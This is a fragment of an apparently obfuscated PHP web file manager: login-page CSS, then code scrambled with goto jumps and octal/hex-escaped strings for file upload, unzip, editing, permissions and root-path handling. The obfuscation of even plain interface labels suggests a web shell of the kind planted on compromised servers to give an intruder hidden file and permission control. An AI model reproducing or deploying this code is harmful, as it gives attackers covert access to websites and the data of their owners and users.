0 0 0 0 302.17V256h18v48h-2v-46H2v42.1zM34 241v63h-2v-62H0v-2h34v1zM17 18H0v-2h16V0h2v18h-1zm273-2h14v2h-16V0h2v16zm-32 273v15h-2v-14h-14v14h-2v-16h18v1zM0 92.1A5.02 5.02 0 0 1 6 97a5 5 0 0 1-6 4.9v-2.07a3 3 0 1 0 0-5.66V92.1zM80 272h2v32h-2v-32zm37.9 32h-2.07a3 3 0 0 0-5.66 0h-2.07a5 5 0 0 1 9.8 0zM5.9 0A5.02 5.02 0 0 1 0 5.9V3.83A3 3 0 0 0 3.83 0H5.9zm294.2 0h2.07A3 3 0 0 0 304 3.83V5.9a5 5 0 0 1-3.9-5.9zm3.9 300.1v2.07a3 3 0 0 0-1.83 1.83h-2.07a5 5 0 0 1 3.9-3.9zM97 100a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-48 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 96a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-144a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-96 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm96 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-32 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM49 36a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-32 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM33 68a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 240a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm80-176a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm112 176a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM17 180a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM17 84a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6z'%3E%3C/path%3E%3C/svg%3E");}
        .fm-login-page .brand{ width:121px;overflow:hidden;margin:0 auto;position:relative;z-index:1}
        .fm-login-page .brand img{ width:100%}
        .fm-login-page .card-wrapper{ width:360px;margin-top:10%;margin-left:auto;margin-right:auto;}
        .fm-login-page .card{ border-color:transparent;box-shadow:0 4px 8px rgba(0,0,0,.05)}
        .fm-login-page .card-title{ margin-bottom:1.5rem;font-size:24px;font-weight:400;}
        .fm-login-page .form-control{ border-width:2.3px}
        .fm-login-page .form-group label{ width:100%}
        .fm-login-page .btn.btn-block{ padding:12px 10px}
        .fm-login-page .footer{ margin:40px 0;color:#888;text-align:center}
        @media screen and (max-width:425px){ 
            .fm-login-page .card-wrapper{ width:90%;margin:0 auto;margin-top:10%;}
        }
        @media screen and (max-width:320px){ 
            .fm-login-page .card.fat{ padding:0}
            .fm-login-page .card.fat .card-body{ padding:15px}
        }
        .message{ padding:4px 7px;border:1px solid #ddd;background-color:#fff}
        .message.ok{ border-color:green;color:green}
        .message.error{ border-color:red;color:red}
        .message.alert{ border-color:orange;color:orange}
        body.fm-login-page.theme-dark {background-color: #2f2a2a;}
        .theme-dark svg g, .theme-dark svg path {fill: #ffffff; }
    </style>
</head>
<body class="fm-login-page <?php  echo rf_THEME == "\144\141\162\x6b" ? "\164\x68\x65\155\145\x2d\144\x61\x72\153" : ''; ?>
">
<div id="wrapper" class="container-fluid">

    <?php  } goto bJqaT; Dg1fH: $parent = rf_get_parent_path(rf_PATH); goto Uo3HX; fD5BD: function rf_object_to_array($obj) { if (!is_object($obj) && !is_array($obj)) { return $obj; } if (is_object($obj)) { $obj = get_object_vars($obj); } return array_map("\x72\146\137\x6f\x62\152\x65\143\x74\137\x74\x6f\x5f\141\x72\x72\x61\x79", $obj); } goto SWDR4; M_SBk: defined("\162\146\137\122\117\117\x54\137\x55\122\114") || define("\162\146\x5f\122\117\x4f\x54\x5f\x55\x52\x4c", ($is_https ? "\x68\164\164\x70\x73" : "\x68\x74\x74\160") . "\72\x2f\57" . $http_host . (!empty($root_url) ? "\57" . $root_url : '')); goto OuRo_; EWuJA: function rf_is_valid_ext($filename) { $allowed = rf_FILE_EXTENSION ? explode("\54", rf_FILE_EXTENSION) : false; $ext = pathinfo($filename, PATHINFO_EXTENSION); $isFileAllowed = $allowed ? in_array($ext, $allowed) : true; return $isFileAllowed ? true : false; } goto Xpd7Q; XOMik: $_POST = strpos($input, "\x61\152\x61\170") != FALSE && strpos($input, "\163\141\166\145") != FALSE ? json_decode($input, true) : $_POST; goto NCJvq; ft6uH: define("\126\105\x52\123\x49\x4f\116", "\x31\56\x30"); goto MMq5b; EAjxM: $allowed_upload_extensions = ''; goto VhIIr; YtYWn: if (!@is_dir($root_path)) { echo "\x3c\150\x31\76\x52\x6f\x6f\x74\x20\160\x61\x74\150\x20\42{$root_path}\42\x20\x6e\x6f\x74\40\146\x6f\x75\156\144\x21\74\x2f\x68\61\76"; die; } goto tTVjW; g5ICz: function lng($txt) { global $lang; $tr["\145\156"]["\101\x70\160\116\x61\155\x65"] = "\106\x69\x6c\145\x20\x4d\x61\156\x61\147\x65\162"; $tr["\145\156"]["\101\x70\x70\124\x69\164\154\x65"] = "\106\x69\x6c\x65\40\x4d\141\x6e\x61\147\x65\x72"; $tr["\145\156"]["\x4c\x6f\147\151\x6e"] = "\x53\151\x67\156\x20\151\156"; $tr["\145\x6e"]["\125\x73\x65\162\156\x61\x6d\x65"] = "\125\x73\x65\162\156\x61\x6d\145"; $tr["\x65\156"]["\x50\x61\163\x73\x77\x6f\x72\x64"] = "\x50\x61\x73\x73\167\x6f\x72\x64"; $tr["\x65\156"]["\x4c\157\147\157\165\x74"] = "\x53\151\147\156\40\x4f\165\x74"; $tr["\x65\x6e"]["\x4d\x6f\166\x65"] = "\115\157\x76\x65"; $tr["\145\x6e"]["\103\x6f\x70\x79"] = "\103\x6f\160\171"; $tr["\145\156"]["\123\141\x76\145"] = "\x53\141\x76\145"; $tr["\x65\156"]["\123\x65\x6c\x65\143\x74\101\154\x6c"] = "\123\x65\x6c\145\x63\164\40\141\x6c\154"; $tr["\x65\156"]["\125\156\x53\x65\154\x65\143\164\x41\154\x6c"] = "\125\x6e\x73\145\154\145\143\164\x20\x61\x6c\154"; $tr["\145\156"]["\x46\x69\154\x65"] = "\x46\x69\154\145"; $tr["\145\156"]["\x42\x61\143\153"] = "\102\x61\x63\x6b"; $tr["\145\x6e"]["\123\151\172\145"] = "\123\151\x7a\145"; $tr["\145\x6e"]["\120\x65\162\155\x73"] = "\x50\x65\x72\155\x73"; $tr["\x65\x6e"]["\115\x6f\144\x69\146\151\145\x64"] = "\115\157\144\x69\146\151\145\144"; $tr["\x65\x6e"]["\x4f\167\156\145\162"] = "\x4f\167\x6e\x65\x72"; $tr["\145\x6e"]["\123\145\x61\162\143\150"] = "\x53\x65\x61\162\x63\150"; $tr["\x65\156"]["\116\145\167\x49\x74\x65\x6d"] = "\x4e\145\x77\40\111\164\145\x6d"; $tr["\x65\156"]["\x46\157\x6c\144\145\x72"] = "\106\157\x6c\144\145\x72"; $tr["\145\x6e"]["\104\145\x6c\x65\x74\145"] = "\104\145\154\x65\x74\x65"; $tr["\145\x6e"]["\122\x65\156\x61\x6d\145"] = "\122\x65\x6e\141\x6d\145"; $tr["\x65\x6e"]["\x43\157\x70\171\124\x6f"] = "\103\157\x70\x79\40\x74\157"; $tr["\x65\x6e"]["\104\x69\x72\x65\x63\164\x4c\x69\156\x6b"] = "\x44\151\x72\x65\143\x74\40\x6c\151\156\153"; $tr["\x65\x6e"]["\x55\160\154\x6f\141\x64\x69\x6e\147\106\151\x6c\x65\x73"] = "\125\160\154\157\x61\144\x20\106\151\154\x65\x73"; $tr["\145\x6e"]["\x43\x68\x61\156\x67\145\x50\x65\x72\155\x69\163\163\x69\x6f\x6e\163"] = "\x43\x68\x61\156\147\145\40\x50\x65\162\155\151\163\163\151\x6f\156\x73"; $tr["\x65\x6e"]["\x43\157\x70\x79\x69\x6e\x67"] = "\x43\x6f\x70\x79\151\x6e\x67"; $tr["\x65\x6e"]["\x43\x72\145\141\164\145\116\145\167\x49\164\145\155"] = "\103\x72\x65\141\164\145\x20\x4e\145\167\40\x49\x74\145\155"; $tr["\145\156"]["\x4e\141\155\x65"] = "\x4e\x61\155\145"; $tr["\x65\156"]["\101\144\x76\141\x6e\x63\x65\144\105\144\151\164\157\162"] = "\x41\144\166\141\x6e\143\145\144\x20\x45\144\x69\164\157\x72"; $tr["\145\156"]["\122\145\155\x65\x6d\x62\145\162\x4d\x65"] = "\122\145\x6d\145\x6d\142\x65\x72\40\115\145"; $tr["\x65\156"]["\x41\143\x74\x69\x6f\156\163"] = "\101\143\164\151\x6f\x6e\x73"; $tr["\145\x6e"]["\125\x70\x6c\157\x61\144"] = "\x55\x70\x6c\157\141\144"; $tr["\x65\x6e"]["\x43\141\x6e\x63\x65\x6c"] = "\x43\x61\156\143\x65\x6c"; $tr["\x65\156"]["\x49\156\x76\145\x72\164\123\145\x6c\145\143\x74\x69\157\156"] = "\x49\156\166\145\x72\164\40\123\145\154\145\x63\x74\151\157\156"; $tr["\145\x6e"]["\x44\145\163\x74\151\x6e\141\x74\151\157\x6e\106\157\154\144\x65\162"] = "\x44\145\x73\164\x69\x6e\x61\x74\x69\x6f\x6e\x20\106\x6f\x6c\x64\x65\x72"; $tr["\x65\x6e"]["\111\x74\x65\155\x54\x79\160\145"] = "\111\164\x65\x6d\40\124\x79\x70\145"; $tr["\x65\156"]["\x49\164\145\155\116\141\155\145"] = "\x49\164\x65\x6d\40\x4e\x61\x6d\145"; $tr["\x65\x6e"]["\x43\162\x65\x61\x74\145\x4e\157\167"] = "\x43\x72\145\x61\164\x65\x20\x4e\157\167"; $tr["\x65\156"]["\x44\157\167\156\154\157\141\x64"] = "\x44\x6f\167\x6e\154\157\x61\x64"; $tr["\x65\x6e"]["\x4f\x70\x65\156"] = "\x4f\x70\145\156"; $tr["\145\156"]["\x55\x6e\132\151\x70"] = "\x55\156\132\151\x70"; $tr["\x65\x6e"]["\125\156\x5a\151\x70\124\x6f\106\x6f\x6c\144\145\x72"] = "\x55\x6e\x5a\151\x70\x20\x74\157\40\146\x6f\x6c\x64\x65\x72"; $tr["\145\156"]["\x45\144\x69\164"] = "\x45\144\x69\x74"; $tr["\x65\x6e"]["\x4e\157\162\x6d\x61\154\x45\x64\x69\164\x6f\162"] = "\116\157\162\155\x61\154\40\x45\x64\x69\x74\157\162"; $tr["\x65\156"]["\102\x61\x63\x6b\125\x70"] = "\102\141\143\x6b\x20\125\x70"; $tr["\x65\x6e"]["\x53\157\165\x72\143\145\x46\157\x6c\x64\145\162"] = "\123\157\x75\162\x63\145\40\106\157\154\144\x65\x72"; $tr["\145\x6e"]["\106\151\154\x65\x73"] = "\x46\x69\154\145\163"; $tr["\145\x6e"]["\x4d\x6f\x76\145"] = "\x4d\157\x76\145"; $tr["\x65\156"]["\x43\x68\x61\156\x67\x65"] = "\103\x68\x61\x6e\x67\145"; $tr["\x65\x6e"]["\123\145\164\x74\x69\156\x67\x73"] = "\x53\145\164\164\x69\156\147\x73"; $tr["\145\x6e"]["\114\141\156\x67\165\141\147\145"] = "\114\x61\156\147\x75\141\x67\x65"; $tr["\x65\x6e"]["\115\x65\x6d\x6f\x72\171\125\x73\x65\144"] = "\x4d\x65\155\x6f\162\x79\x20\x75\163\x65\x64"; $tr["\145\x6e"]["\120\141\162\164\x69\x74\151\157\156\123\151\172\145"] = "\120\141\162\x74\x69\164\151\x6f\156\x20\163\x69\x7a\x65"; $tr["\x65\156"]["\105\162\162\x6f\162\x52\x65\x70\x6f\x72\x74\151\x6e\147"] = "\x45\162\162\157\162\x20\x52\145\160\157\162\x74\x69\156\147"; $tr["\145\156"]["\x53\x68\157\167\x48\151\144\144\x65\x6e\x46\x69\x6c\x65\163"] = "\x53\150\157\167\40\110\x69\x64\x64\x65\156\40\106\x69\154\x65\x73"; $tr["\145\x6e"]["\106\x75\x6c\154\x20\163\151\x7a\145"] = "\x46\x75\x6c\154\x20\x73\151\x7a\145"; $tr["\x65\x6e"]["\110\x65\154\160"] = "\x48\x65\154\160"; $tr["\x65\x6e"]["\x46\162\x65\x65\x20\x6f\146"] = "\x46\162\145\145\x20\157\x66"; $tr["\x65\156"]["\x50\162\x65\x76\151\x65\167"] = "\x50\162\x65\166\151\x65\x77"; $tr["\x65\x6e"]["\x48\145\x6c\x70\x20\104\157\143\x75\x6d\x65\156\164\x73"] = "\110\x65\x6c\160\x20\104\157\143\x75\155\145\x6e\x74\163"; $tr["\x65\156"]["\x52\x65\160\157\162\x74\x20\111\163\163\165\145"] = "\122\145\x70\157\162\164\40\x49\163\163\165\145"; $tr["\145\156"]["\107\x65\156\x65\x72\141\x74\145"] = "\107\145\156\145\162\x61\x74\x65"; $tr["\145\x6e"]["\x46\165\x6c\x6c\x53\151\172\145"] = "\106\x75\x6c\x6c\40\x53\151\172\x65"; $tr["\145\156"]["\x46\x72\145\x65\117\146"] = "\146\x72\x65\x65\40\x6f\x66"; $tr["\x65\156"]["\x43\x61\x6c\143\x75\154\x61\x74\x65\106\x6f\x6c\144\145\162\123\x69\x7a\145"] = "\x43\x61\154\x63\x75\x6c\141\x74\x65\x20\x66\157\x6c\x64\x65\x72\40\163\x69\172\145"; $tr["\x65\156"]["\120\162\157\x63\x65\163\x73\111\104"] = "\120\x72\157\x63\x65\163\x73\x20\111\x44"; $tr["\145\x6e"]["\103\162\145\141\x74\x65\144"] = "\103\x72\145\x61\164\x65\144"; $tr["\x65\156"]["\110\x69\x64\145\103\157\x6c\165\155\x6e\163"] = "\x48\151\x64\x65\40\x50\x65\x72\x6d\163\x2f\117\167\x6e\145\x72\40\143\157\154\x75\x6d\x6e\x73"; $tr["\x65\156"]["\x46\157\154\144\145\x72\40\151\163\40\x65\155\x70\164\171"] = "\106\x6f\x6c\x64\145\x72\x20\x69\163\40\x65\x6d\x70\x74\x79"; $tr["\145\x6e"]["\x43\x68\x65\x63\153\40\x4c\x61\x74\145\163\x74\x20\126\x65\x72\x73\x69\x6f\156"] = "\x43\150\x65\x63\x6b\x20\114\x61\164\145\x73\164\40\x56\145\x72\163\151\157\x6e"; $tr["\x65\x6e"]["\x47\x65\156\145\x72\x61\x74\x65\x20\x6e\145\x77\40\x70\141\163\x73\167\157\x72\144\x20\x68\141\163\x68"] = "\x47\145\156\145\x72\141\x74\145\x20\x6e\x65\167\x20\160\141\163\163\x77\157\x72\x64\x20\150\141\x73\150"; $tr["\145\156"]["\131\x6f\x75\x20\x61\x72\145\40\x6c\157\147\x67\145\x64\40\151\x6e"] = "\x59\x6f\x75\40\x61\x72\145\x20\154\157\x67\147\145\x64\x20\151\x6e"; $tr["\145\x6e"]["\114\x6f\147\151\156\40\x66\x61\x69\154\x65\x64\x2e\x20\111\156\x76\x61\x6c\151\144\x20\x75\163\x65\x72\x6e\x61\x6d\x65\40\157\162\x20\160\141\163\163\167\x6f\x72\144"] = "\114\x6f\x67\151\x6e\x20\146\141\x69\154\x65\x64\x2e\x20\x49\x6e\x76\141\154\151\144\x20\x75\x73\145\x72\156\x61\x6d\x65\x20\x6f\x72\40\160\141\163\x73\x77\157\x72\144"; $tr["\x65\156"]["\x70\141\163\163\167\x6f\162\x64\x5f\x68\141\x73\x68\x20\x6e\x6f\x74\x20\x73\x75\160\160\157\162\x74\x65\144\x2c\40\x55\x70\147\162\x61\x64\x65\40\x50\110\120\x20\x76\x65\162\x73\x69\x6f\156"] = "\x70\x61\x73\163\167\x6f\x72\x64\137\x68\x61\163\150\x20\x6e\157\164\40\163\165\160\160\x6f\162\164\x65\144\x2c\x20\x55\x70\147\x72\x61\144\x65\40\120\x48\x50\x20\166\145\162\x73\151\x6f\156"; $i18n = rf_get_translations($tr); $tr = $i18n ? $i18n : $tr; if (!strlen($lang)) { $lang = "\x65\156"; } if (isset($tr[$lang][$txt])) { return rf_enc($tr[$lang][$txt]); } else { if (isset($tr["\145\x6e"][$txt])) { return rf_enc($tr["\x65\156"][$txt]); } else { return "{$txt}"; } } }